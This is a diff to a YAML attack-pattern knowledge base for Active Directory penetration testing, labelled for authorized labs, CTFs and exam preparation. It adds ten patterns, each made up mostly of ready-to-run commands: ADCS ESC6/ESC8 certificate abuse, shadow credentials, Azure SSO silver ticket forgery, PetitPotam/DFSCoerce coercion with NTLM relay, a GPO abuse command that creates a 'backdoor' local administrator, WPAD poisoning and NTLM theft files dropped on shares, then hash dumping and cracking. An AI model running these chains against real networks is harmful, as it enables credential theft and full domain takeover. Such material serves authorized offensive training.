@@ -1,6 +1,13 @@
-schema_version: 2.2
+schema_version: 2.3
 intended_use: Authorized labs, CTFs, and exam preparation only
-last_updated: 2026-03-13
+last_updated: 2026-07-06
+# v2.3 additions (ad-recon-toolkit parity — Kali-native tools):
+#   fingerprint_map: ADCS entry updated (+ESC6, +ESC8, +SHADOW-CREDENTIALS)
+#   foothold_patterns: +10 patterns (ADCS-ESC6, ADCS-ESC8, SHADOW-CREDENTIALS,
+#     AZUREADSSOACC-SILVER, COERCE-AUTH, GPO-WRITE, DHCP-WPAD, RID-CYCLING,
+#     LDAPDOMAINDUMP, NTLM-THEFT-SHARE)
+#   All new patterns use Kali-native tooling (certipy, pywhisker, bloodyAD,
+#     responder, impacket) — no Windows required
 # v2.2 additions (spellbook integration):
 #   fingerprint_map: +15 entries (IPMI, Rsync, MongoDB, NATS, IMAP, GraphQL,
 #     WebSocket, Timeroast, LAPS, NoPAC, ADCS, Kubernetes, Docker API,
@@ -568,6 +575,9 @@ service_fingerprint_map:
     likely_paths:
       - ADCS-ESC1
       - ADCS-ESC4
+      - ADCS-ESC6
+      - ADCS-ESC8
+      - SHADOW-CREDENTIALS
     recommended_enumeration:
       - certipy find -u user@domain -p pass -dc-ip <target>
       - certipy find -u user@domain -p pass -dc-ip <target> -vulnerable -stdout
@@ -2293,6 +2303,284 @@ foothold_patterns:
       - dump all cached items for session tokens and credentials
       - inject malicious cache entries if write allowed
     estimated_exam_frequency: low
+
+  # ── v2.3: AD-recon-toolkit parity (Kali-native) ─────────────────────────
+
+  - id: ADCS-ESC6
+    name: ADCS ESC6 — CA Flag EDITF_ATTRIBUTESUBJECTALTNAME2
+    trigger:
+      services: [http, ldap]
+      condition: certipy find shows EDITF_ATTRIBUTESUBJECTALTNAME2 in CA configuration
+    description: >
+      ESC6: The CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, making every
+      template that allows domain authentication a SAN-supply vector — even
+      templates not individually configured for ESC1. Any enrollee can specify
+      an arbitrary UPN in the SAN, impersonating any user including Domain Admin.
+      No template modification required. certipy detects this in CA flags output.
+    enumeration_commands:
+      - certipy find -u user@domain -p pass -dc-ip <target> -vulnerable -stdout
+      - "look for: EDITF_ATTRIBUTESUBJECTALTNAME2 in CA configuration section"
+      - "find any enrollable template with Client Authentication EKU:"
+      - certipy req -u user@domain -p pass -ca <CA-name> -template User -upn administrator@domain -dc-ip <target>
+      - certipy auth -pfx administrator.pfx -dc-ip <target>
+    likely_next_steps:
+      - use any enrollable template — no need for template modification
+      - authenticate with pfx to get NTLM hash or TGT
+      - pass the hash with impacket-psexec or evil-winrm
+    kali_tools:
+      - "certipy: pip install certipy-ad (or already installed)"
+    estimated_exam_frequency: medium_high
+
+  - id: ADCS-ESC8
+    name: ADCS ESC8 — HTTP Enrollment NTLM Relay
+    trigger:
+      services: [http, ldap]
+      condition: AD CS HTTP enrollment accessible without EPA; coercion possible
+    description: >
+      ESC8: AD CS HTTP enrollment (/certsrv) accepts NTLM without Extended
+      Protection for Authentication (EPA). Relay a coerced machine account
+      authentication (PetitPotam / DFSCoerce / PrinterBug) to the web enrollment
+      endpoint to obtain a certificate for the coerced machine — typically a DC,
+      yielding DA via secretsdump. certipy relay is the Kali-native one-shot.
+    enumeration_commands:
+      - certipy find -u user@domain -p pass -dc-ip <target> -vulnerable -stdout
+      - "look for: [!] Web Enrollment: Enabled AND [!] No EPA / signing"
+      - "Terminal 1 — relay listener:"
+      - certipy relay -ca <ca-ip> -template DomainController
+      - "Terminal 2 — coerce DC authentication:"
+      - python3 /opt/PetitPotam/PetitPotam.py -u user -p pass <kali-ip> <dc-ip>
+      - python3 /opt/DFSCoerce/dfscoerce.py -u user -p pass <kali-ip> <dc-ip>
+      - "Alternative with ntlmrelayx:"
+      - impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
+    likely_next_steps:
+      - certipy auth -pfx dc.pfx -dc-ip <target>
+      - impacket-secretsdump -k -no-pass domain/dc@<dc-ip>
+      - full domain hash dump for DA
+    kali_tools:
+      - "certipy: pip install certipy-ad"
+      - "PetitPotam: /opt/PetitPotam/PetitPotam.py"
+      - "DFSCoerce: /opt/DFSCoerce/dfscoerce.py"
+    estimated_exam_frequency: medium_high
+
+  - id: SHADOW-CREDENTIALS
+    name: Shadow Credentials — msDS-KeyCredentialLink Write
+    trigger:
+      services: [ldap]
+      condition: GenericWrite or GenericAll on any user or computer account
+    description: >
+      If an attacker can write the msDS-KeyCredentialLink attribute on a user
+      or computer, they add a certificate credential. Authenticating with this
+      certificate via PKINIT returns the account's NTLM hash. certipy shadow
+      auto is the fastest Kali path — runs the full chain in one command.
+      Often the quickest path from GenericWrite to NTLM hash, no password change needed.
+    enumeration_commands:
+      - bloodhound-python -c ALL -ns <dc-ip> -u user -p pass -d domain --zip
+      - "in BloodHound: look for GenericWrite/GenericAll edges to user/computer nodes"
+      - "One-shot (certipy — recommended on Kali):"
+      - certipy shadow auto -u user@domain -p pass -account <target-account> -dc-ip <target>
+      - "Manual (pywhisker):"
+      - pywhisker -d domain -u user -p pass --target <victim> --action add
+    likely_next_steps:
+      - certipy shadow returns NTLM hash directly — pass the hash immediately
+      - impacket-psexec or evil-winrm with recovered hash
+      - if target is computer account use hash for secretsdump or RBCD
+    kali_tools:
+      - "certipy: pip install certipy-ad"
+      - "pywhisker: pip install pywhisker"
+    estimated_exam_frequency: medium_high
+
+  - id: AZUREADSSOACC-SILVER
+    name: AZUREADSSOACC$ Silver Ticket — Azure AD SSO Forgery
+    trigger:
+      services: [ldap, kerberos-sec]
+      condition: hybrid Azure AD environment; AZUREADSSOACC$ NTLM hash recoverable
+    description: >
+      In hybrid Azure AD environments the AZUREADSSOACC$ machine account provides
+      Seamless SSO to Azure. Its RC4 key is often never rotated (default risk).
+      With the NTLM hash (from DC secretsdump or AZUREADSSOACC$ targeted dump),
+      forge a silver ticket for http/autologon.microsoftazuread-sso.com to
+      authenticate as any synced AD user to Azure AD services without their password.
+    enumeration_commands:
+      - "Confirm hybrid environment (look for AZUREADSSOACC$ in AD):"
+      - netexec ldap <dc> -u user -p pass --query "(cn=AZUREADSSOACC*)" cn
+      - "Dump AZUREADSSOACC$ hash:"
+      - impacket-secretsdump domain/user:pass@<dc> -just-dc-user 'AZUREADSSOACC$'
+      - "Forge silver ticket:"
+      - impacket-ticketer -nthash <NTLM-HASH> -domain-sid <SID> -domain <DOMAIN> -spn http/autologon.microsoftazuread-sso.com <target-synced-user>
+      - export KRB5CCNAME=<target-synced-user>.ccache
+    likely_next_steps:
+      - authenticate to Azure portal / Office 365 as target user
+      - access email, SharePoint, Teams, Azure resources
+      - pivot to cloud roles if any Azure RBAC assigned
+    estimated_exam_frequency: low_medium
+
+  - id: COERCE-AUTH
+    name: Authentication Coercion — PetitPotam / DFSCoerce / PrinterBug
+    trigger:
+      services: [smb, msrpc]
+      condition: need machine account NetNTLM for relay or hash capture
+    description: >
+      Coercion techniques force Windows machines (including DCs) to authenticate
+      to an attacker-controlled host using their machine account NTLM credentials.
+      Essential prerequisite for ESC8 relay, NTLM relay to LDAP/S, RBCD, and
+      Responder hash capture. PetitPotam (MS-EFSR) works with any valid user and
+      no Spooler needed. DFSCoerce (MS-DFSNM) is an alternative when PetitPotam
+      is patched. PrinterBug (MS-RPRN) requires Spooler running on target.
+    enumeration_commands:
+      - "Check PrinterBug availability (Spooler):"
+      - impacket-rpcdump @<target> | grep -E 'MS-RPRN|MS-PAR'
+      - "PetitPotam — preferred (works with any domain user):"
+      - python3 /opt/PetitPotam/PetitPotam.py -u user -p pass <kali-ip> <target>
+      - "DFSCoerce — fallback if EFS patched:"
+      - python3 /opt/DFSCoerce/dfscoerce.py -u user -p pass <kali-ip> <target>
+      - "PrinterBug:"
+      - python3 /opt/printerbug/printerbug.py 'domain/user:pass@<target>' <kali-ip>
+      - "Capture with Responder in parallel:"
+      - responder -I eth0 -dwPv
+    likely_next_steps:
+      - for hash capture: responder captures NTLMv2 → hashcat -m 5600
+      - for ADCS ESC8: pair with certipy relay or ntlmrelayx --adcs
+      - for LDAP relay: impacket-ntlmrelayx -t ldap://<dc> --delegate-access (RBCD)
+    kali_tools:
+      - "responder: responder -I eth0 -dwPv"
+      - "PetitPotam: /opt/PetitPotam/PetitPotam.py"
+      - "DFSCoerce: /opt/DFSCoerce/dfscoerce.py"
+    estimated_exam_frequency: high
+
+  - id: GPO-WRITE
+    name: GPO Write Access — Group Policy Object Abuse
+    trigger:
+      services: [ldap, smb]
+      condition: GenericWrite or GenericAll on a GPO linked to high-value OU
+    description: >
+      Write access to a GPO linked to an OU with privileged computers or users
+      allows executing arbitrary commands as SYSTEM on next GP refresh (~90 min).
+      pyGPOAbuse adds an immediate scheduled task via the GPO. SharpGPOAbuse
+      is the Windows equivalent. BloodHound surfaces GenericWrite/GenericAll
+      edges to GPO nodes. Commonly overlooked — check all GPO edges in BH.
+    enumeration_commands:
+      - bloodhound-python -c ALL -ns <dc-ip> -u user -p pass -d domain --zip
+      - "in BloodHound: Owned → find GPO nodes with GenericWrite edges"
+      - "Check GPO scope (which computers/users are affected):"
+      - netexec smb <dc> -u user -p pass -M gporeport
+      - "Exploit — add local admin via scheduled task:"
+      - python3 /opt/pyGPOAbuse/pygpoabuse.py -u user -p pass -d domain -gpo-id <GPO-GUID> -command 'net user backdoor P@ss123 /add && net localgroup administrators backdoor /add' -powershell
+      - "Confirm GPO GUID from BloodHound GPO node Properties tab"
+    likely_next_steps:
+      - wait for GP refresh or trigger via psexec: gpupdate /force
+      - SMB/WinRM/RDP with new local admin
+      - escalate to DA via lateral movement
+    kali_tools:
+      - "pyGPOAbuse: /opt/pyGPOAbuse/pygpoabuse.py"
+      - "bloodyAD: pip install bloodyAD"
+    estimated_exam_frequency: medium
+
+  - id: DHCP-WPAD
+    name: DHCP WPAD Poisoning — Coercion When LLMNR/NBT-NS Disabled
+    trigger:
+      services: [smb, http]
+      condition: DHCP server delivers option 252 (WPAD URL)
+    description: >
+      In hardened environments where LLMNR and NBT-NS are disabled, Responder
+      hash capture still works if the DHCP server serves option 252 (WPAD proxy
+      URL). Windows auto-detect proxy connects to attacker-controlled URL and
+      authenticates with NTLMv2. Responder -d flag intercepts DHCP and serves
+      rogue WPAD. Also check DHCP options 66/67 for PXE attack surface.
+    enumeration_commands:
+      - "Detect WPAD in DHCP:"
+      - nmap -sU -p 67 --script dhcp-discover <dhcp-server>
+      - netexec smb <dc> -u user -p pass -M dhcp
+      - "look for: option 252 in output — contains WPAD URL"
+      - "If WPAD present — run Responder with DHCP rogue:"
+      - responder -I eth0 -dwPv
+      - "Crack captured NTLMv2:"
+      - hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
+    likely_next_steps:
+      - NTLMv2 hash captured even when LLMNR/NBT-NS firewalled
+      - crack offline or relay with ntlmrelayx if SMB signing disabled
+    estimated_exam_frequency: low_medium
+
+  - id: RID-CYCLING
+    name: RID Cycling — Full User Enumeration via SID Brute
+    trigger:
+      services: [microsoft-ds]
+      condition: null session or any authenticated SMB access
+    description: >
+      Every AD object has a predictable RID. Iterating RIDs 500-9999 via
+      LsarLookupSids builds a complete user/group/computer list without LDAP
+      access. Works with null sessions (unauthenticated) or domain credentials.
+      Faster than LDAP enumeration on constrained networks and bypasses some
+      LDAP ACL restrictions. Use as the first enumeration step when no creds
+      and no anonymous LDAP bind.
+    enumeration_commands:
+      - lookupsid.py 'anonymous'@<dc>
+      - lookupsid.py 'CORP/user:pass'@<dc>
+      - netexec smb <dc> -u '' -p '' --rid-brute
+      - netexec smb <dc> -u user -p pass --rid-brute 10000
+    likely_next_steps:
+      - compile username list for password spraying or AS-REP roasting
+      - filter output to user accounts (type: SidTypeUser)
+      - feed into kerbrute for pre-auth validation
+    kali_tools:
+      - "lookupsid.py: installed with impacket"
+      - "netexec: nxc or netexec"
+    estimated_exam_frequency: medium
+
+  - id: LDAPDOMAINDUMP
+    name: LDAPDomainDump — Fast AD Situational Awareness
+    trigger:
+      services: [ldap]
+      condition: any valid domain credentials obtained
+    description: >
+      ldapdomaindump generates HTML/JSON/grep reports covering: all users with
+      SPNs, UAC flags, last logon, description fields; all computers; groups;
+      trusts; GPO links; and password policy. Faster and more readable than
+      raw LDAP queries for initial orientation. Run BEFORE BloodHound — description
+      fields commonly contain plaintext passwords. Pre-installed on Kali.
+    enumeration_commands:
+      - ldapdomaindump ldap://<dc> -u 'domain\user' -p 'pass' -o /tmp/ldd/
+      - "Open /tmp/ldd/domain_users.html in browser for triage"
+      - grep -i 'pass\|pwd\|cred\|secret' /tmp/ldd/domain_users.grep
+      - "Check adminCount=1 accounts (AdminSDHolder protected):"
+      - grep adminCount /tmp/ldd/domain_users.grep
+    likely_next_steps:
+      - review description fields for embedded passwords
+      - identify accounts with SPN (Kerberoast targets)
+      - pivot to BloodHound for graph-based attack path analysis
+      - check domain_trusts.html for cross-domain paths
+    kali_tools:
+      - "ldapdomaindump: pre-installed on Kali or pip install ldapdomaindump"
+    estimated_exam_frequency: very_high
+
+  - id: NTLM-THEFT-SHARE
+    name: NTLM Theft via Writable Share — Hash Capture Without Email
+    trigger:
+      services: [microsoft-ds]
+      condition: writable SMB share accessible; target users browse it
+    description: >
+      When a target user browses an attacker-controlled or writable share,
+      ntlm_theft generates various file types (.url, .lnk, .scf, desktop.ini,
+      .library-ms) that trigger automatic NTLM authentication to an attacker
+      host. No email required — effective for internal pivots where a share
+      is monitored by multiple users. Responder captures the NTLMv2 hash.
+      Most reliable triggers: .url (Shell:Internet Shortcut), .scf (Shell Command),
+      desktop.ini (folder icon path).
+    enumeration_commands:
+      - "Generate NTLM theft files:"
+      - python3 /opt/ntlm_theft/ntlm_theft.py -g all -s <kali-ip> -f capture
+      - "Drop files into writable share:"
+      - smbclient //<target>/sharename -U user%pass -c 'put capture.url'
+      - smbclient //<target>/sharename -U user%pass -c 'put capture.scf'
+      - "Capture incoming auth:"
+      - responder -I eth0 -dwPv
+    likely_next_steps:
+      - wait for user to browse the share
+      - crack NTLMv2: hashcat -m 5600 hash.txt rockyou.txt
+      - or relay with ntlmrelayx if SMB signing disabled
+    kali_tools:
+      - "ntlm_theft: /opt/ntlm_theft/ntlm_theft.py"
+      - "responder: responder -I eth0"
+    estimated_exam_frequency: medium
 
 
 # ─────────────────────────────────────────────────────────────────────────────
